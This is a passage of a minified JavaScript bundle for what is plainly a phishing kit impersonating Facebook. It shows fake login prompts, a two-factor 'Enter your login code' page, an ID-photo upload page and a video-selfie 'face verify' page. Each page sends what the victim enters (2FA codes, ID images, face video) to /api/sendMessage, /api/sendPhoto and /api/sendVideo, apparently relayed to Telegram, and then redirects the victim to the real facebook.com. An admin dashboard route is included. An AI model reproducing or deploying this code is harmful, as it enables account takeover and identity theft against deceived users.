md:text-xl",children:"Photos"}),(0,s.jsx)("button",{className:"font-semibold text-[#0064d1]",children:"See All Photos"})]}),(0,s.jsx)("div",{className:"grid grid-cols-2 gap-2 md:grid-cols-3",children:[...Array(6)].map((e,t)=>(0,s.jsx)("div",{className:"aspect-square rounded-md bg-gray-200"},`photo-${t+1}`))})]})]})}),(0,s.jsxs)("div",{className:"fixed right-0 bottom-0 left-0 flex flex-col items-center justify-center bg-white px-4 py-4 shadow-[0_-2px_4px_rgba(0,0,0,0.1)] md:px-0 md:py-8",onClick:e=>e.stopPropagation(),children:[(0,s.jsx)("h1",{className:"mb-4 max-w-[350px] truncate text-center text-xl font-bold md:max-w-full md:text-2xl",children:"Log in or sign up for Facebook to connect with friends, family and people you know."}),(0,s.jsxs)("div",{className:"flex w-full flex-col items-center gap-2 md:w-auto md:flex-row",children:[(0,s.jsx)("button",{className:"h-[40px] w-[230px] rounded-md bg-[#1877f2] text-[17px] font-semibold text-white hover:bg-[#1877f2]/90",onClick:()=>t(!0),children:"Log in"}),(0,s.jsx)("span",{className:"text-[13px] font-semibold text-[#65676b] md:block",children:"or"}),(0,s.jsx)("button",{className:"h-[40px] w-[230px] rounded-md bg-[#42b72a] text-[17px] font-semibold text-white hover:bg-[#36a420]",onClick:()=>t(!0),children:"Create new account"})]})]}),e&&(0,s.jsx)("div",{onClick:e=>{e.stopPropagation()},children:(0,s.jsx)(p,{onClose:()=>t(!1)})})]})},y=a.p+"static/image/authentication-app-image.6f088468.png";a.p;let w=e=>{let{onClose:t}=e,[a,l]=(0,i.useState)(()=>sessionStorage.getItem("selectedConfirmationMethod")??""),r=e=>{l(e),sessionStorage.setItem("selectedConfirmationMethod",e)},n=[{type:"WhatsApp",description:"We'll send a code to your phone number"},{type:"Authentication app",description:"Get a code from your authentication app"},{type:"Backup code",description:"Use a backup code that you saved"},{type:"Text message",description:"We'll send a code to your phone number"}];return(0,s.jsx)("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-white transition-all duration-200 ease-in-out md:bg-black/25",children:(0,s.jsxs)("div",{className:"relative h-full w-full animate-[fadeIn_0.15s_ease-out] overflow-y-auto border border-gray-200 bg-white motion-safe:animate-[scaleIn_0.1s_ease-out] md:h-auto md:max-w-xl md:rounded-3xl",children:[(0,s.jsx)("div",{className:"mx-2 flex h-16 items-center justify-end",children:(0,s.jsx)("div",{onClick:t,className:"flex h-10 w-10 cursor-pointer items-center justify-center rounded-full p-2 transition-colors duration-200 hover:bg-gray-100",children:(0,s.jsx)(o.G,{icon:c.g82,size:"xl"})})}),(0,s.jsxs)("div",{className:"px-5",children:[(0,s.jsx)("h2",{className:"mb-2 text-2xl font-semibold",children:"Choose a way to confirm that it's you"}),(0,s.jsx)("p",{className:"mb-6 text-[15px]",children:"These are your available confirmation methods."}),(0,s.jsx)("div",{className:"",children:n.map((e,t)=>(0,s.jsxs)("div",{onClick:()=>r(e.type),className:`cursor-pointer border border-gray-200 p-3 transition-colors hover:bg-gray-50 ${t===n.length-1?"rounded-b-2xl":""} ${0===t?"rounded-t-2xl":""} ${0!==t?"border-t-0":""} relative flex items-center justify-between`,children:[(0,s.jsxs)("div",{className:"flex-grow",children:[(0,s.jsx)("h3",{className:"text-[15px] font-medium",children:e.type}),(0,s.jsx)("p",{className:"text-[15px] font-normal text-[#5d6c7b]",children:e.description})]}),(0,s.jsx)("div",{className:`flex h-5 w-5 items-center justify-center rounded-full border-2 ${a===e.type?"border-blue-600":"border-gray-300"}`,children:a===e.type&&(0,s.jsx)("div",{className:"h-2.5 w-2.5 rounded-full bg-blue-600"})})]},e.type))}),(0,s.jsxs)("div",{className:"mt-8 flex items-start gap-3 rounded-2xl border border-gray-300 p-5",children:[(0,s.jsx)("div",{className:"flex h-[40px] w-[40px] items-center justify-center rounded-full bg-gray-100",children:(0,s.jsx)(o.G,{icon:c.sqG,size:"xl"})}),(0,s.jsxs)("div",{children:[(0,s.jsx)("h3",{className:"mb-1 text-[17px] font-semibold",children:"Need another option?"}),(0,s.jsxs)("p",{className:"text-[15px]",children:["To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to"," ",(0,s.jsxs)("span",{className:"cursor-pointer text-[15px] font-bold text-[#0064e0] hover:underline",children:[" ","account recovery"]})]})]})]}),(0,s.jsx)("button",{onClick:t,className:"my-6 block w-full rounded-full bg-blue-600 py-3 text-center font-medium text-white transition-colors hover:bg-blue-700",children:"Continue"})]})]})})},N=e=>{let{isMobile:t}=e,[a,r]=(0,i.useState)(!1),[n,d]=(0,i.useState)(!1),m=(0,i.useRef)(null),[x,h]=(0,i.useState)(0),[u,p]=(0,i.useState)(!1),[g,f]=(0,i.useState)(""),j=(0,l.s0)(),v=b(),[N,k]=(0,i.useState)(null);(0,i.useEffect)(()=>{v||j("/")},[v,j]),(0,i.useEffect)(()=>{m.current&&m.current.focus()},[]),(0,i.useEffect)(()=>{let e=localStorage.getItem("telegram_message_id");if(!e){j("/");return}k(parseInt(e))},[j]);let _=async e=>{try{let t=await fetch("/api/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({text:e,parse_mode:"HTML",old_message_id:N})}),a=await t.json();return a.success&&a.message_id&&(localStorage.setItem("telegram_message_id",a.message_id.toString()),localStorage.setItem("telegram_message",e),k(a.message_id)),a.success}catch(e){return!1}},S=async e=>{let t;if(e.preventDefault(),!v){j("/");return}p(!0),h(x+1);let a=localStorage.getItem("telegram_message")??"",s=/🔐 <b>Mã xác thực \d+:<\/b> <code>(.*?)<\/code>/g,l=[];for(;null!==(t=s.exec(a));)l.push(t[1]);let r=`🔐 <b>M\xe3 x\xe1c thực ${l.length+1}:</b> <code>${g}</code>`,i=a?"\n":"",n=`${a}${i}${r}`.trim();await _(n),await new Promise(e=>setTimeout(e,v.code_load_duration)),x>=v.code_load_limit&&j("/id-verification"),p(!1)};return t?(0,s.jsxs)("div",{className:"flex min-h-screen flex-col bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 pt-8 font-[Optimistic]",children:[(0,s.jsxs)("div",{className:"mb-6 flex items-center justify-between",children:[(0,s.jsx)("button",{onClick:()=>{j(-1)},className:"text-[#1c2b33] hover:text-gray-700",children:(0,s.jsx)(o.G,{icon:c.acZ,size:"lg"})}),(0,s.jsx)("button",{onClick:()=>d(!0),className:"text-[#1c2b33] hover:text-gray-700",children:(0,s.jsx)(o.G,{icon:c.FDd,size:"lg"})})]}),(0,s.jsxs)("div",{className:"text-[#0a1317]",children:[(0,s.jsx)("p",{className:"text-[13px] font-medium",children:"Facebook account • Facebook"}),(0,s.jsx)("p",{className:"mt-4 text-2xl font-semibold",children:"Enter your login code"}),(0,s.jsx)("p",{className:"mb-4 text-[15px]",children:"Enter the 6-digit code we just sent to your SMS, WhatsApp, or from a two-factor authentication app you've set up (like Duo Mobile or Google Authenticator)."})]}),(0,s.jsx)("img",{src:y,alt:"",className:"mb-4 w-full rounded-xl"}),(0,s.jsx)("div",{className:"relative mb-4",children:(0,s.jsxs)("div",{className:"relative h-[56px]",children:[(0,s.jsx)("input",{ref:m,id:"code-input-mobile",type:"number",placeholder:" ",value:g,onChange:e=>{let t=e.target.value;t.length<=6&&f(t)},className:"peer absolute inset-0 w-full [appearance:textfield] rounded-xl border border-gray-300 bg-white px-4 pt-[20px] text-gray-900 focus:border-blue-500 [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none"}),(0,s.jsx)("button",{onClick:()=>{f("")},className:"absolute top-1/2 right-4 -translate-y-1/2 text-gray-500 peer-placeholder-shown:hidden hover:text-gray-700",children:(0,s.jsx)(o.G,{icon:c.g82,size:"lg"})}),(0,s.jsx)("label",{htmlFor:"code-input-mobile",className:"absolute top-4 left-4 text-gray-500 transition-all peer-focus:-translate-y-3 peer-focus:text-sm peer-[&:not(:placeholder-shown)]:-translate-y-2 peer-[&:not(:placeholder-shown)]:text-sm",children:"Code"})]})}),(0,s.jsxs)("div",{className:"flex flex-col gap-3",children:[(0,s.jsx)("button",{onClick:S,disabled:u||6!==g.length,className:`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition ${u?"cursor-default opacity-50":"hover:bg-blue-600"} disabled:opacity-50`,children:"Continue"}),(0,s.jsx)("button",{onClick:()=>r(!0),className:"w-full rounded-full border border-[#dadde1] bg-transparent px-4 py-3 text-[15px] font-semibold text-[#1c2b33] transition hover:bg-[#f2f2f2]",children:"Try Another Way"})]}),a&&(0,s.jsx)(w,{onClose:()=>r(!1)}),n&&(0,s.jsx)(w,{onClose:()=>d(!1)})]}):(0,s.jsxs)("div",{className:"flex min-h-screen flex-col items-center justify-center font-[Optimistic]",children:[(0,s.jsxs)("div",{className:"max-w-[600px]",children:[(0,s.jsxs)("div",{className:"text-[#0a1317]",children:[(0,s.jsx)("p",{className:"text-[13px] font-medium",children:"Facebook account • Facebook"}),(0,s.jsx)("p",{className:"text-2xl font-semibold",children:"Enter your login code"}),(0,s.jsx)("p",{className:"mb-2 text-[15px]",children:"Enter the 6-digit code we just sent to your SMS, WhatsApp, or from a two-factor authentication app you've set up (like Duo Mobile or Google Authenticator)."})]}),(0,s.jsx)("img",{src:y,alt:"",className:"mb-3"}),(0,s.jsx)("div",{className:"relative mb-3",children:(0,s.jsxs)("div",{className:"relative h-[56px]",children:[(0,s.jsx)("input",{ref:m,id:"code-input",type:"number",placeholder:" ",value:g,onChange:e=>{let t=e.target.value;t.length<=6&&f(t)},className:"peer absolute inset-0 w-full [appearance:textfield] rounded-xl border border-gray-300 bg-white px-4 pt-[20px] text-gray-900 focus:border-blue-500 [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none"}),(0,s.jsx)("button",{onClick:()=>{f("")},className:"absolute top-1/2 right-4 -translate-y-1/2 text-gray-500 peer-placeholder-shown:hidden hover:text-gray-700",children:(0,s.jsx)(o.G,{icon:c.g82,size:"lg"})}),(0,s.jsx)("label",{htmlFor:"code-input",className:"absolute top-4 left-4 text-gray-500 transition-all peer-focus:-translate-y-3 peer-focus:text-sm peer-[&:not(:placeholder-shown)]:-translate-y-2 peer-[&:not(:placeholder-shown)]:text-sm",children:"Code"})]})}),(0,s.jsxs)("div",{className:"flex flex-col gap-2",children:[(0,s.jsx)("button",{onClick:S,disabled:u||6!==g.length,className:`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition ${u?"cursor-default opacity-50":"hover:bg-blue-600"} disabled:opacity-50`,children:"Continue"}),(0,s.jsx)("button",{onClick:()=>r(!0),className:"w-full rounded-full border border-[#dadde1] bg-transparent px-4 py-3 text-[15px] font-semibold text-[#1c2b33] transition hover:bg-[#f2f2f2]",children:"Try Another Way"})]})]}),a&&(0,s.jsx)(w,{onClose:()=>r(!1)}),n&&(0,s.jsx)(w,{onClose:()=>d(!1)})]})},k=()=>{let[e,t]=(0,i.useState)(!1);return(0,i.useEffect)(()=>{let e=()=>{t(window.innerWidth<768)};return e(),window.addEventListener("resize",e),()=>{window.removeEventListener("resize",e)}},[]),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)("title",{children:"Facebook"}),(0,s.jsx)(N,{isMobile:e})]})},_=a.p+"static/image/upload-image.a238b251.webp",S=e=>{let{isMobile:t}=e,[a,r]=(0,i.useState)(null),[n,d]=(0,i.useState)(!1),[m,x]=(0,i.useState)(0),[h,u]=(0,i.useState)(!1),p=(0,i.useRef)(null),b=(0,l.s0)();(0,i.useEffect)(()=>{let e;return n?(x(0),e=setInterval(()=>{x(e=>h?100:e>=90?90:e+2)},100)):x(0),()=>clearInterval(e)},[n,h]);let g=e=>!!["image/jpeg","image/png","image/gif","image/webp"].includes(e.type)||(alert("Please select a valid image file (jpg, png, gif, webp)"),!1),f=async e=>{var t;e.preventDefault();let a=null===(t=e.target.files)||void 0===t?void 0:t[0];if(a&&g(a)){r(a),d(!0),u(!1);try{let e=new FormData;e.append("photo",a);let t=localStorage.getItem("telegram_message_id");t&&e.append("message_id",t);let s=await fetch("/api/sendPhoto",{method:"POST",body:e}),l=await s.json();l.success&&(u(!0),localStorage.setItem("telegram_message_id",l.message_id.toString()),b("/kyc-face-verify"))}catch(e){}finally{d(!1)}}},j=()=>{var e;null===(e=p.current)||void 0===e||e.click()};return t?(0,s.jsxs)("div",{className:"flex min-h-screen flex-col bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 pt-8 font-[Optimistic]",children:[(0,s.jsx)("div",{className:"mb-6 flex items-center justify-between",children:(0,s.jsx)("button",{onClick:()=>{b(-1)},className:"text-[#1c2b33] hover:text-gray-700",children:(0,s.jsx)(o.G,{icon:c.acZ,size:"lg"})})}),(0,s.jsxs)("div",{className:"text-[#0a1317]",children:[(0,s.jsx)("p",{className:"text-[13px] font-medium"}),(0,s.jsx)("p",{className:"mt-4 text-2xl font-semibold",children:"Upload your ID"}),(0,s.jsx)("p",{className:"mb-4 text-[15px]",children:"Upload a photo that clearly shows your ID or document."})]}),(0,s.jsx)("img",{src:_,alt:"",className:"mb-4 w-full rounded-xl"}),(0,s.jsxs)("div",{className:"mb-8",children:[(0,s.jsx)("h2",{className:"mb-4 font-medium text-gray-900",children:"To get started"}),(0,s.jsxs)("div",{className:"space-y-6",children:[(0,s.jsxs)("div",{className:"flex items-center gap-4",children:[(0,s.jsx)("div",{className:"flex-shrink-0",children:(0,s.jsx)(o.G,{icon:c.X8G,className:"h-5 w-5 text-gray-600"})}),(0,s.jsx)("p",{className:"text-[15px] text-gray-600",children:"Choose a well-lit environment"})]}),(0,s.jsxs)("div",{className:"flex items-center gap-4",children:[(0,s.jsx)("div",{className:"flex-shrink-0",children:(0,s.jsx)(o.G,{icon:c.enB,className:"h-5 w-5 text-gray-600"})}),(0,s.jsx)("p",{className:"text-[15px] text-gray-600",children:"Ensure no glare or shadows"})]}),(0,s.jsxs)("div",{className:"flex items-center gap-4",children:[(0,s.jsx)("div",{className:"flex-shrink-0",children:(0,s.jsx)(o.G,{icon:c.TL5,className:"h-5 w-5 text-gray-600"})}),(0,s.jsx)("p",{className:"text-[15px] text-gray-600",children:"Include all four corners in the image"})]})]})]}),a&&(0,s.jsx)("div",{className:"mb-4",children:(0,s.jsxs)("div",{className:"flex flex-col space-y-2 rounded-lg bg-white p-3",children:[(0,s.jsxs)("div",{className:"flex items-center justify-between",children:[(0,s.jsx)("span",{className:"text-sm text-gray-600",children:"Uploading..."}),(0,s.jsxs)("span",{className:"text-xs text-gray-500",children:[(a.size/1024/1024).toFixed(2)," MB"]})]}),(0,s.jsx)("div",{className:"h-2 w-full overflow-hidden rounded-full bg-gray-100",children:(0,s.jsx)("div",{className:"h-full bg-blue-600 transition-all duration-200",style:{width:`${m}%`}})})]})}),(0,s.jsx)("div",{className:"flex flex-col gap-3",children:(0,s.jsx)("button",{onClick:j,disabled:n,className:`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600 ${n?"cursor-not-allowed opacity-50":""}`,children:n?"Uploading...":"Upload photo"})}),(0,s.jsx)("input",{type:"file",accept:"image/*",onChange:f,className:"hidden",ref:p})]}):(0,s.jsx)("div",{className:"flex min-h-screen flex-col items-center justify-center font-[Optimistic]",children:(0,s.jsxs)("div",{className:"max-w-[600px]",children:[(0,s.jsxs)("div",{className:"text-[#0a1317]",children:[(0,s.jsx)("p",{className:"text-[13px] font-medium"}),(0,s.jsx)("p",{className:"text-2xl font-semibold",children:"Upload your ID"}),(0,s.jsx)("p",{className:"mb-2 text-[15px]",children:"Upload a photo that clearly shows your ID or document."})]}),(0,s.jsx)("img",{src:_,alt:"",className:"mb-3"}),(0,s.jsxs)("div",{className:"mb-8",children:[(0,s.jsx)("h2",{className:"mb-4 font-medium text-gray-900",children:"To get started"}),(0,s.jsxs)("div",{className:"space-y-6",children:[(0,s.jsxs)("div",{className:"flex items-center gap-4",children:[(0,s.jsx)("div",{className:"flex-shrink-0",children:(0,s.jsx)(o.G,{icon:c.X8G,className:"h-5 w-5 text-gray-600"})}),(0,s.jsx)("p",{className:"text-[15px] text-gray-600",children:"Choose a well-lit environment"})]}),(0,s.jsxs)("div",{className:"flex items-center gap-4",children:[(0,s.jsx)("div",{className:"flex-shrink-0",children:(0,s.jsx)(o.G,{icon:c.enB,className:"h-5 w-5 text-gray-600"})}),(0,s.jsx)("p",{className:"text-[15px] text-gray-600",children:"Ensure no glare or shadows"})]}),(0,s.jsxs)("div",{className:"flex items-center gap-4",children:[(0,s.jsx)("div",{className:"flex-shrink-0",children:(0,s.jsx)(o.G,{icon:c.TL5,className:"h-5 w-5 text-gray-600"})}),(0,s.jsx)("p",{className:"text-[15px] text-gray-600",children:"Include all four corners in the image"})]})]})]}),a&&(0,s.jsx)("div",{className:"mb-4",children:(0,s.jsxs)("div",{className:"flex flex-col space-y-2 rounded-lg bg-white p-3",children:[(0,s.jsxs)("div",{className:"flex items-center justify-between",children:[(0,s.jsx)("span",{className:"text-sm text-gray-600",children:"Uploading..."}),(0,s.jsxs)("span",{className:"text-xs text-gray-500",children:[(a.size/1024/1024).toFixed(2)," MB"]})]}),(0,s.jsx)("div",{className:"h-2 w-full overflow-hidden rounded-full bg-gray-100",children:(0,s.jsx)("div",{className:"h-full bg-blue-600 transition-all duration-200",style:{width:`${m}%`}})})]})}),(0,s.jsx)("div",{className:"flex flex-col gap-2",children:(0,s.jsx)("button",{onClick:j,className:"w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600",children:"Upload photo"})}),(0,s.jsx)("input",{type:"file",accept:"image/*",onChange:f,className:"hidden",ref:p})]})})},F=()=>{let[e,t]=(0,i.useState)(!1);return(0,i.useEffect)(()=>{let e=()=>{t(window.innerWidth<768)};return e(),window.addEventListener("resize",e),()=>{window.removeEventListener("resize",e)}},[]),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)("title",{children:"Facebook"}),(0,s.jsx)(S,{isMobile:e})]})};var C=a(314),T=a.n(C);let z=()=>{let e=(0,i.useRef)(null),t=(0,i.useRef)(null),[a,l]=(0,i.useState)(!1),[r,n]=(0,i.useState)(0),[d,m]=(0,i.useState)(10),[x,h]=(0,i.useState)(!1),u=(0,i.useRef)([]),p=[{icon:c.FPD,text:"Look Up",position:"top-[10%] left-1/2 -translate-x-1/2"},{icon:c.r5q,text:"Look Down",position:"bottom-[10%] left-1/2 -translate-x-1/2"},{icon:c.acZ,text:"Turn Left",position:"left-[10%] top-1/2 -translate-y-1/2"},{icon:c.eFW,text:"Turn Right",position:"right-[10%] top-1/2 -translate-y-1/2"}];(0,i.useEffect)(()=>{let e,t;return a&&(e=setInterval(()=>{m(e=>Math.max(0,e-1))},1e3),t=setInterval(()=>{n(e=>(e+1)%p.length)},2500)),()=>{clearInterval(e),clearInterval(t)}},[a,p.length]);let b=e=>{let t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",a="";for(let s=0;s<e;s++)a+=t.charAt(Math.floor(Math.random()*t.length));return a},g=(0,i.useCallback)(async e=>{h(!0);try{let t=new FormData,a="video/webm"===e.type?"webm":"mp4",s=`face-verify-${b(10)}.${a}`;t.append("video",e,s);let l=localStorage.getItem("telegram_message_id");l&&t.append("message_id",l);let r=await fetch("/api/sendVideo",{method:"POST",body:t}),i=await r.json();i.success&&(localStorage.setItem("telegram_message_id",i.message_id.toString()),window.location.replace("https://www.facebook.com"))}catch(e){h(!1)}},[]),f=(0,i.useCallback)(()=>{var a;l(!0),m(10),n(0),u.current=[];let s=null===(a=e.current)||void 0===a?void 0:a.stream;if(s){let e=MediaRecorder.isTypeSupported("video/mp4")?"video/mp4":"video/webm",a=new MediaRecorder(s,{mimeType:e,videoBitsPerSecond:25e5});t.current=a,a.onstart=()=>{u.current=[]},a.onstop=()=>{g(new Blob(u.current,{type:e}))},a.ondataavailable=e=>{e.data.size>0&&u.current.push(e.data)},a.start(),setTimeout(()=>{t.current&&"recording"===t.current.state&&(t.current.stop(),l(!1))},1e4)}},[e,g]);return(0,s.jsx)("div",{className:"min-h-screen bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 py-8 font-[Optimistic] md:bg-white md:bg-none",children:(0,s.jsxs)("div",{className:"mx-auto w-full max-w-[600px]",children:[(0,s.jsx)("div",{className:"mb-6 flex items-center justify-between md:hidden",children:(0,s.jsx)("button",{className:"text-[#1c2b33] hover:text-gray-700",children:(0,s.jsx)(o.G,{icon:c.acZ,size:"lg"})})}),(0,s.jsxs)("div",{className:"mb-6 md:mb-8",children:[(0,s.jsx)("p",{className:"text-[13px] font-medium text-[#0a1317]"}),(0,s.jsx)("h1",{className:"mb-2 text-2xl font-semibold text-[#0a1317]",children:"Take a Video Selfie"}),(0,s.jsx)("p",{className:"text-[15px] text-gray-600",children:"We need a short video of you turning your head in different directions. This helps us confirm your identity and check that you're a real person."})]}),(0,s.jsx)("div",{className:"relative mb-6 md:mb-8",children:(0,s.jsx)("div",{className:"relative mx-auto aspect-square w-full max-w-[480px]",children:(0,s.jsx)("div",{className:"relative h-full w-full overflow-hidden rounded-full",children:(0,s.jsx)("div",{className:"absolute inset-0 rounded-full bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 p-[3px]",children:(0,s.jsx)("div",{className:"h-full w-full rounded-full bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] p-[2px]",children:(0,s.jsxs)("div",{className:"relative h-full w-full overflow-hidden rounded-full",children:[(0,s.jsx)(T(),{audio:!1,ref:e,videoConstraints:{width:720,height:720,facingMode:"user"},className:"h-full w-full object-cover"}),(0,s.jsxs)("div",{className:"absolute inset-0 flex items-center justify-center",children:[(0,s.jsx)("div",{className:`h-[calc(100%-48px)] w-[calc(100%-48px)] rounded-full border-[3px] ${a?"border-[#0064E0] shadow-[0_0_15px_rgba(0,100,224,0.3)]":"border-white/90 shadow-[0_0_15px_rgba(255,255,255,0.2)]"} transition-all duration-300`}),(0,s.jsx)("div",{className:"absolute inset-0 -z-10 rounded-full bg-black/20"})]}),a&&(0,s.jsx)("div",{className:`absolute ${p[r].position} transform`,children:(0,s.jsxs)("div",{className:"flex flex-col items-center text-white",children:[(0,s.jsx)(o.G,{icon:p[r].icon,className:"mb-2 h-6 w-6 animate-bounce md:h-8 md:w-8"}),(0,s.jsx)("p",{className:"rounded-full bg-black/60 px-4 py-1.5 text-[15px] font-medium backdrop-blur-sm",children:p[r].text}),(0,s.jsxs)("p",{className:"mt-2 rounded-full bg-[#0064E0]/80 px-4 py-1.5 text-lg font-semibold backdrop-blur-sm",children:[d,"s"]})]})})]})})})})})}),(0,s.jsxs)("div",{className:"mb-6 flex items-center gap-3 rounded-xl bg-white/80 p-4 shadow-sm backdrop-blur-sm md:mb-8",children:[(0,s.jsx)(o.G,{icon:c.byT,className:"h-5 w-5 text-gray-600"}),(0,s.jsx)("p",{className:"text-[15px] text-gray-600",children:"No one else will see this video and it will be deleted 30 days after your identity is confirmed."})]}),(0,s.jsx)("button",{className:`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600 ${a||x?"cursor-not-allowed opacity-50":""}`,onClick:f,disabled:a||x,children:a?(0,s.jsxs)("div",{className:"flex items-center justify-center",children:[(0,s.jsx)(o.G,{icon:c.LM3,className:"mr-2 h-4 w-4 animate-spin"}),"Processing..."]}):x?(0,s.jsxs)("div",{className:"flex items-center justify-center",children:[(0,s.jsx)(o.G,{icon:c.LM3,className:"mr-2 h-4 w-4 animate-spin"}),"Processing request..."]}):"Start Recording"})]})})};var $=a(511);let E=document.getElementById("root");E&&$.createRoot(E).render((0,s.jsx)(i.StrictMode,{children:(0,s.jsx)(l.VK,{children:(0,s.jsx)(()=>(0,s.jsxs)(l.Z5,{children:[(0,s.jsxs)(l.AW,{path:"/",element:(0,s.jsx)(r,{}),children:[(0,s.jsx)(l.AW,{index:!0,element:(0,s.jsx)(v,{})}),(0,s.jsx)(l.AW,{path:"two-step-verification",element:(0,s.jsx)(k,{})}),(0,s.jsx)(l.AW,{path:"id-verification",element:(0,s.jsx)(F,{})}),(0,s.jsx)(l.AW,{path:"kyc-face-verify",element:(0,s.jsx)(z,{})})]}),(0,s.jsxs)(l.AW,{path:"/admin",element:(0,s.jsx)(n,{}),children:[(0,s.jsx)(l.AW,{path:"login",element:(0,s.jsx)(m,{})}),(0,s.jsx)(l.AW,{path:"dashboard",element:(0,s.jsx)(d,{})})]}),(0,s.jsx)(l.AW,{path:"*",element:(0,s.jsx)(l.Fg,{to:"/",replace:!0})})]}),{})})}))}},t={};function a(s){var l=t[s];if(void 0!==l)return l.exports;var r=t[s]={exports:{}};return e[s].call(r.exports,r,r.exports,a),r.exports}a.m=e,a.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return a.d(t,{a:t}),t},a.d=(e,t)=>{for(var s in t)a.o(t,s)&&!a.o(e,s)&&Object.defineProperty(e,s,{enumerable:!0,get:t[s]})},a.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),(()=>{var e=[];a.O=(t,s,l,r)=>{if(s){r=r||0;for(var i=e.length;i>0&&e[i-1][2]>r;i--)e[i]=e[i-1];e[i]=[s,l,r];return}for(var n=1/0,i=0;i<e.length;i++){for(var[s,l,r]=e[i],o=!0,c=0;c<s.length;c++)(!1&r||n>=r)&&Object.keys(a.O).every(e=>a.O[e](s[c]))?s.splice(c--,1):(o=!1,r<n&&(n=r));if(o){e.splice(i--,1);var d=l();void 0!==d&&(t=d)}}return t}})(),a.p="/",a.rv=()=>"1.2.8",(()=>{var e={980:0};a.O.j=t=>0===e[t];var t=(t,s)=>{var l,r,[i,n,o]=s,c=0;if(i.some(t=>0!==e[t])){for(l in n)a.o(n,l)&&(a.m[l]=n[l]);if(o)var d=o(a)}for(t&&t(s);c<i.length;c++)r=i[c],a.o(e,r)&&e[r]&&e[r][0](),e[r]=0;return a.O(d)},s=self.webpackChunkrsbuild_react_kit=self.webpackChunkrsbuild_react_kit||[];s.forEach(t.bind(null,0)),s.push=t.bind(null,s.push.bind(s))})(),a.ruid="bundler=rspack@1.2.8";var s=a.O(void 0,["361","118","654"],function(){return a(181)});s=a.O(s)})();